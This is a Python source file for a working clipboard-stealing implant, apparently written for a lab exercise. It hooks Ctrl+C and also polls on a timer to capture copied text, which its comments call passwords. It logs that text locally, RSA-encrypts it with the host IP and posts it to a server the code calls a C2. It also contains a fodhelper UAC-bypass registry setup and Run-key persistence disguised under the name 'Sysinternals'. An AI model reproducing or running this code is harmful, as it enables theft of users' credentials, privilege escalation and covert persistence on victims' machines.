import os.path
import pyperclip
import requests
import schedule
import time
import subprocess
from pynput import keyboard
import keyboard
import rsa
import socket

#public key for encryption
public = rsa.PublicKey(
        22801902741575260508046760451684121524343309971392815027806038442328813626689876929878295531764425101721113803279088975380306285103839798562486473563504890609732689910231035352994358600476885112341914819232866689789408515621209722745373194438974054762656866686749518758325281935986106093899741071523184790288397250570095386108667233843051192504696785064008214814463197996158290147894449246014411585018720395948432620796871823751561082698116083062968467223326531809351871820333024478963454054743945987929181103396110463090638025544498539475681820761973201801628104421055632663943101423395201694333712187265928179307257,
        65537)

def main():

    #gets the clipboard information and puts it in a file every 90 seconds.
    schedule.every(90).seconds.do(get_clipboard_info)

    #Reestablishes the persistence mechanisms
    #schedule.every(45).seconds.do(reestablish)

    #Adds a hotkey, can't have parenthesis because it returns as a none type instead of a boolean
    #explore the timeout feature to add some more functionality
    keyboard.add_hotkey('ctrl+c', get_clipboard_info)

    #ctrl V ensures that the clipboard data is changed to password
    keyboard.add_hotkey('ctrl+v', add_invisible_character_to_clipboard)

    #from https://schedule.readthedocs.io/en/stable/examples.html, schedule documentation
    #code handles the scheduled task
    while True:
        schedule.run_pending()
        time.sleep(1)

#global value that stores the last clipboardValue copied, starts as empty
last_clip_board_value = ''

"""
get_clipboard_info is triggered when Ctrl+C happens. The method checks if the clipboard data 
is different from the last clipboard data that was copied. If it is, then it adds it to the local 
clipboard data file, adds a timestamp to the password, and sends a post request to the server with 
the copied data. The copied data is first encrypted using RSA 
"""
def get_clipboard_info():
    #have to define as a global because of how python scope works
    global last_clip_board_value
    global public

    #need a delay here so that the ctrl+c copy updates the clipboard before the information is grabbed
    #if we do not have this delay: at the end of this method the clipboard info is changed to password
    #so if there is no delay then the password sometimes remains as the clipboard info
    #it would then be saved as the clipboard info before copy updates. this delay makes sure that
    #the clipboard is updated with the copied info before it is assigned to any variables
    #short delay so that when ctrl+v is used it still copies password over and then pastes it
    time.sleep(0.25)

    try:
        # paste, pastes text from clipboard
        clipboard_info = pyperclip.paste()

        # a appends data to file so the passwords can be stored over time password
        filepath = os.path.join('C:/Tools/Sysint/MalTest/', 'info')
        if not os.path.exists('C:/Tools/Sysint/MalTest/'):

            #makes the directory if the path doesn't exist
            os.makedirs('C:/Tools/Sysint/MalTest/')
            filepath = os.path.join('C:/Tools/Sysint/MalTest/', 'info')

        clipboard_data_file = open(filepath, "a")

        #checks if the last clipboard value is equal to the current one
        if not last_clip_board_value == clipboard_info:

            #writes the clipboard value to the file along with a timestamp
            clipboard_data_file.write(clipboard_info + ' (' + time.asctime(time.localtime()) + ')')
            clipboard_data_file.write("\n")

            #https: // www.w3resource.com / python - exercises / python - basic - exercise - 55.php
            #gets the list of hostnames
            local_hostname = socket.gethostname()

            #gets list of ip addresses associated with hostname
            ip_addresses = socket.gethostbyname_ex(local_hostname)[2]

            #make a list same size as the IP's
            filtered = list()
            i = 0

            # https: // www.w3resource.com / python - exercises / python - basic - exercise - 55.php
            #loops through ip addresses and removes local host callbacks
            for ip in ip_addresses:
                if not ip[0:4] == '127.':
                    #appends to python list
                    filtered.append(ip)
                    i += 1

            #varibale used to store the clipboard info being transmitted in a post request
            #encoded using utf8 so it can be encrypted using rsa
            formatted_clipboard_info = (clipboard_info + ' - ' + filtered[0] + ' - (' + time.asctime(time.localtime()) + ')').encode('utf8')
            encoded_clipboard_info = rsa.encrypt(formatted_clipboard_info, public)

            #closes the file since it is done being used
            clipboard_data_file.close()

            #posts the request back to the c2 server, passing along the encoded clipboard information
            requests.post("http://10.168.3.254/output", encoded_clipboard_info)

        #if the last and current clipboard value match then close the file
        else:
            clipboard_data_file.close()

        #Updates the last clipboard value
        last_clip_board_value = clipboard_info

        #changes the clipboard data to the same word but with an invisible character at the end
        add_invisible_character_to_clipboard()
    except:
        pass

"""
add_invisible_character_to_clipboard takes the current clipboard_value and adds an invisible character takes takes
to the end of it
"""
def add_invisible_character_to_clipboard() -> None:
    # https://unicode-explorer.com/c/115F
    invisible_character = 'ᅟ'

    # paste, pastes text from clipboard
    clipboard_info = pyperclip.paste()

    # copy - copies whatever text to the clipboard
    #in this case copies the current clipboard info plus an invisible character
    #could use endswith or in(java contains)
    #if there is already an invisible character then we don't need another
    if invisible_character in clipboard_info:
        pyperclip.copy(clipboard_info)
    else:
        pyperclip.copy(clipboard_info + invisible_character)

"""
Reestablishes persistence mechanism once it gets deleted

Used as resources:  
https://www.sharepointdiary.com/2022/12/powershell-check-if-registry-key-exists.htm - Powershell commands
https://gist.github.com/netbiosX/a114f8822eb20b115e33db55deee6692 - UAC Bypass
https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/set-item?view=powershell-7.5: Set-Item
https://foldsab.github.io/posts/UAC_bypass_using_fodhelper/ - Fodhelper exploit
https://www.linkedin.com/pulse/abusing-fodhelperexe-bypass-uac-prompt-elevate-poc-abhishek-sharma-crqsc/ - Fodhelper
https://www.phillipsj.net/posts/executing-powershell-from-python/#:~:text=The%20code,can%20import%20the%20subprocess%20module.&text=Now%20we%20can%20make%20our,to%20execute%20our%20PowerShell%20command.&text=Let's%20make%20our%20Python%20file,commands%20we%20want%20to%20execute. - subprocess running correcting
https://www.digitalocean.com/community/tutorials/python-system-command-os-subprocess-call  - subprocess.call 
https://www.datacamp.com/tutorial/python-subprocess
"""
def reestablish() -> None:
    #cmd to see if the runkey already exists
    cmd_check = ["powershell", "-Command", "Get-ItemProperty", "-Path",
                 "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "-Name",
                 "Sysinternals", "-ErrorAction", "SilentlyContinue"]

    #cmd to add a runkey to the windows box that references the fodhelper.exe backdoor
    cmd5 = ["reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "Sysinternals", "/t",
            "REG_SZ", "/d", "C:\\Windows\\System32\\fodhelper.exe"]

    #checks the run key is not already there
    if not subprocess.run(cmd_check):
        subprocess.run(cmd5)

"""
change_password changes the clipboard data to password
"""
def change_password() -> None:
    # copy - copies whatever test to the clipboard
    #in this case copies the current clipboard info plus an invisible character
    pyperclip.copy('password')

"""
Establishes the fodhelper.exe backdoor by adding the necessary runkeys, also adds the persistence runkey in \Run

Used as resources:  
https://www.sharepointdiary.com/2022/12/powershell-check-if-registry-key-exists.htm - Powershell commands
https://gist.github.com/netbiosX/a114f8822eb20b115e33db55deee6692 - UAC Bypass
https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/set-item?view=powershell-7.5: Set-Item
https://foldsab.github.io/posts/UAC_bypass_using_fodhelper/ - Fodhelper exploit
https://www.linkedin.com/pulse/abusing-fodhelperexe-bypass-uac-prompt-elevate-poc-abhishek-sharma-crqsc/ - Fodhelper
https://www.phillipsj.net/posts/executing-powershell-from-python/#:~:text=The%20code,can%20import%20the%20subprocess%20module.&text=Now%20we%20can%20make%20our,to%20execute%20our%20PowerShell%20command.&text=Let's%20make%20our%20Python%20file,commands%20we%20want%20to%20execute. - subprocess running correcting
https://www.digitalocean.com/community/tutorials/python-system-command-os-subprocess-call  - subprocess.call 
https://www.datacamp.com/tutorial/python-subprocess 
"""
def establish():
    cmd = ["powershell", "-Command", "New-Item", "-Path", "HKCU:\\SOFTWARE\\Classes\\ms-settings\\shell\\open\\command", "-Force"]

    cmd2 = ["powershell", "-Command", "New-ItemProperty", "-Path", "HKCU:\\SOFTWARE\\Classes\\ms-settings\\shell\\open\\command", "-Name",
            "DelegateExecute", "-Value", "?", "-Force"]

    cmd3 = ["powershell", "-Command", "Set-Item", "-Path", "HKCU:\\SOFTWARE\\Classes\\ms-settings\\shell\\open\\command",
            "-Value", "C:\\Windows\\System32\\ProcMon.exe", "-Force"]


    #TODO: schedule task... At Login, powershell.exe -c fodhelper.exe
    #'New-ScheduledTaskTrigger', 'At-LogOn'
    #'New-ScheduledTaskAction', '-Execute', 'powershell.exe', '-c', 'fodhelper.exe'

    #schedule_cmd = ['Register-ScheduledTask', 'Sysinternals', '-Action', 'At-LogOn', '-Trigger',
    #                '-Execute', 'powershell.exe', '-c', 'fodhelper.exe']

    #'Register-ScheduledTask Sysinternals -Trigger -AtLogon -Action -Execute powershell.exe -c fodhelper.exe'

    #cmd5 = ["reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "Sysinternals", "/t",
    #        "REG_SZ", "/d", "C:\\Windows\\System32\\fodhelper.exe"]

    #cmd_check = ["powershell", "-Command", "Get-ItemProperty", "-Path",
    #             "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "-Name",
    #             "Sysinternals", "-ErrorAction", "SilentlyContinue"]

    subprocess.run(cmd)
    subprocess.run(cmd2)
    subprocess.run(cmd3)
    #subprocess.run(schedule_cmd)

    #Checks the runkey does not exist
    #if not subprocess.run(cmd_check):
    #subprocess.run(cmd5)


#runs establish and then starts the main prorgam
#establish()
main()